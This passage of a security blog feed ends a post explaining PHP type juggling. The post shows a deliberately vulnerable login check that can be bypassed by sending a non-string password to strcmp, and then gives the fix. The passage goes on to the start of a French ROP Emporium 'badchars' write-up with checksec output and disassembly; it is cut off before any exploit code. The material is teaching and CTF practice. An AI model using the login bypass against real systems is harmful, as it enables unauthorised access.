</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;False&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>When comparing the two values, PHP will turn 123456789.0000000000 into an integer because it has no decimal value. The condition will then return <code>True</code>, which is mathematically correct but could allow an attacker to bypass length restrictions</p>
<p>Here is a table that shows the different results when a <strong>loose comparison</strong> (when PHP uses type juggling) occurs in <strong>PHP 7.X</strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/211122304-a2f5f310-ddbb-4b71-b8e2-63d9406de2d9.png" alt="Pasted image 20230107010517"></p>
<h1 id="better-example">Better example</h1>
<p>I will use a &ldquo;PHP Type juggling&rdquo; challenge I made as an example for this part.</p>
<blockquote>
<p>I will try to explain the code as much as I can, so don&rsquo;t worry if you&rsquo;re not comfortable with PHP.</p></blockquote>
<p>Here is the backend of a login page:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($username <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strcmp</span>(<span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">openssl_random_pseudo_bytes</span>(<span style="color:#ae81ff">10</span>)),$_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$_SESSION[<span style="color:#e6db74">&#39;isAdmin&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location:admin.php&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location:index.php?error=credentials&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>First, we make sure that the two POST parameters (used to pass the username and the password) are not empty. This line is not vulnerable.</p>
<p>The vulnerability is in the next condition, the one that checks the password. The <strong>strcmp</strong> function is used to compare a randomly generated password with the user&rsquo;s input.</p>
<blockquote>
<p>We compare the input with a randomly generated password because the goal of this challenge is not to figure out what the password is but rather to bypass the condition</p></blockquote>
<p>The <strong>strcmp</strong> function compares two strings and returns <code>0</code> if they are equal. To know if they are, we have to check if the function returned <code>0</code> or not.</p>
<p>What we can see is that this verification is made using a <strong>loose comparison</strong> (only two = were used)</p>
<p>And you should know that <strong>strcmp</strong> returns <code>NULL</code> if one of the two passed arguments is not a string. Knowing that, we just have to enter something else than a string for the password, and the function will return <code>NULL</code></p>
<p>By looking back the to <strong>loose comparison</strong> table, the condition NULL == 0 is <code>True</code>, so the whole comparison will also be <code>True</code>, like if the right password was entered.</p>
<h1 id="how-to-avoid-type-juggling-issues">How to avoid type juggling issues</h1>
<p>There&rsquo;s no magic method to avoid these problems all the time, but it is highly recomended to use strict comparisons (use three = instead of two) as often as you can, if not all the time.</p>
<p>Otherwise, you can also verify that the user entered two strings and not a string and an array (for example). <strong>Never trust user input</strong></p>
<h1 id="conclusion">Conclusion</h1>
<p>PHP is overall a good programming language, flexible and easy to get comfortable with. But all these advantages come at a cost, and one careless mistake can expose your application to critical vulnerabilities, that&rsquo;s why it is important to know how PHP works.</p>
<p>I hope this post helped you understand what is <strong>type juggling</strong>, if you have any questions or if I made English mistakes feel free to contact me on <a href="/about">discord</a>.</p>
<p>Here are a few links if you want to practice exploiting type juggling vulnerabilities</p>
<p><a href="https://theblackside.fr/challenges/web/PHP---Quirk">https://theblackside.fr/challenges/web/PHP---Quirk</a></p>
<p><a href="https://theblackside.fr/challenges/web/super_secure_local_access">https://theblackside.fr/challenges/web/super_secure_local_access</a></p>
<p><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling">https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling</a></p>
<h1 id="further-documentation">Further documentation</h1>
<p><a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf</a></p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - badchars (x64)</title>
            <link>/posts/2023/01/ropemporium-badchars-x64/</link>
            <pubDate>Wed, 04 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-badchars-x64/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Cinquièment exo de ROPemporium, je le trouve moins sympa que les autres. Il reprend le principe du challenge précédent, mais il introduit un nouveau gadget pour contourner le &amp;ldquo;filtre&amp;rdquo;: le &lt;code&gt;xor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Comme d&amp;rsquo;habitude, si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur &lt;a href=&#34;https://discord.com/users/254689803822563348&#34;&gt;discord&lt;/a&gt; pour me le dire.&lt;/p&gt;
&lt;p&gt;Si vous ne comprenez pas quelque chose, je vous invite à &lt;a href=&#34;/series/ropemporium-x64-series/&#34;&gt;regarder la série dans l&amp;rsquo;ordre&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Et je vous conseille fortement de lire l&amp;rsquo;exercice précédent pour mieux comprendre ce que je fais ici puisque la méchanique principale est la même.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Cinquièment exo de ROPemporium, je le trouve moins sympa que les autres. Il reprend le principe du challenge précédent, mais il introduit un nouveau gadget pour contourner le &ldquo;filtre&rdquo;: le <code>xor</code></p>
<p>Comme d&rsquo;habitude, si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="/series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<p>Et je vous conseille fortement de lire l&rsquo;exercice précédent pour mieux comprendre ce que je fais ici puisque la méchanique principale est la même.</p>
<h2 id="description">Description</h2>
<pre tabindex="0"><code>The good, the bad

Dealing with bad characters is frequently necessary in exploit development, you&#39;ve probably had to deal with them before while encoding shellcode. &#34;Badchars&#34; are the reason that encoders such as shikata-ga-nai exist. When constructing your ROP chain remember that the badchars apply to every character you use, not just parameters but addresses too. To mitigate the need for too much RE the binary will list its badchars when you run it.
Options

ropper has a bad characters option to help you avoid using gadgets whose address will terminate your chain prematurely, it will certainly come in handy. Note that the amount of garbage data you&#39;ll need to send to the ARM challenge is slightly different.
Moar XOR

You&#39;ll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the print_file() method to print the contents of the flag file, just like in the last challenge. Think about how we&#39;re going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it&#39;s in memory? 
</code></pre><h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">badchars</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">badchars</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">6c79e265b17cf6845beca7e17d6d8ac2ecb27556</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">badchars</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/badchars_x64/badchars&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation">Exploitation</h2>
<p>On va le lancer pour voir ce qu&rsquo;il fait concrètement:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/215351090-d424b61d-309b-4fc7-94b5-2c42cb11dfd3.png" alt="2023-01-29-174453_1698x557_scrot"></p>
<p>On voit que si on entre un nombre élevé de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commencé à overwrite des registres.</p>
<p>Je vais passer assez vite sur la première partie de l&rsquo;exploit puisque c&rsquo;est la même chose que l&rsquo;<a href="/posts/2023/01/ropemporium-badchars-x64/#write4">exo précédent</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x00007ffff7c008fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x40</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00902</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2006cf</span>]        <span style="color:#75715e"># 0x7ffff7e00fd8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00909</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:    mov    rax,QWORD PTR [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0090c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:    mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00911</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00916</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c007e0</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00923</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x17a</span>]        <span style="color:#75715e"># 0x7ffff7c00aa4</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x187</span>]        <span style="color:#75715e"># 0x7ffff7c00abd</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00936</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:    lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:    add    rax,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00943</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00948</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0094d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">83</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00950</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c007b0</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00955</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">91</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16c</span>]        <span style="color:#75715e"># 0x7ffff7c00ac8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0095c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00961</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x181</span>]        <span style="color:#75715e"># 0x7ffff7c00ae9</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00968</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>:   mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0096d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">115</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c007a0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00972</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>:   lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00976</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0097a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:   mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0097f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">133</span><span style="color:#f92672">&gt;</span>:   mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00982</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>:   mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00987</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">141</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c007c0</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0098c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">146</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00990</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00998</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">158</span><span style="color:#f92672">&gt;</span>:   jmp    <span style="color:#ae81ff">0x7ffff7c009eb</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">241</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0099a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">168</span><span style="color:#f92672">&gt;</span>:   jmp    <span style="color:#ae81ff">0x7ffff7c009d5</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">219</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">174</span><span style="color:#f92672">&gt;</span>:   movzx  ecx,BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ad</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">179</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">183</span><span style="color:#f92672">&gt;</span>:   mov    rdx,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200628</span>]        <span style="color:#75715e"># 0x7ffff7e00fe0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009b8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">190</span><span style="color:#f92672">&gt;</span>:   movzx  eax,BYTE PTR [rdx<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009bc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">194</span><span style="color:#f92672">&gt;</span>:   cmp    cl,al
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">196</span><span style="color:#f92672">&gt;</span>:   jne    <span style="color:#ae81ff">0x7ffff7c009c9</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">207</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">198</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">202</span><span style="color:#f92672">&gt;</span>:   mov    BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>],<span style="color:#ae81ff">0xeb</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">207</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009cd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">211</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">215</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">219</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>:   cmp    rax,<span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009dd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">227</span><span style="color:#f92672">&gt;</span>:   jbe    <span style="color:#ae81ff">0x7ffff7c009a4</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">229</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009e3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">233</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x1</span>
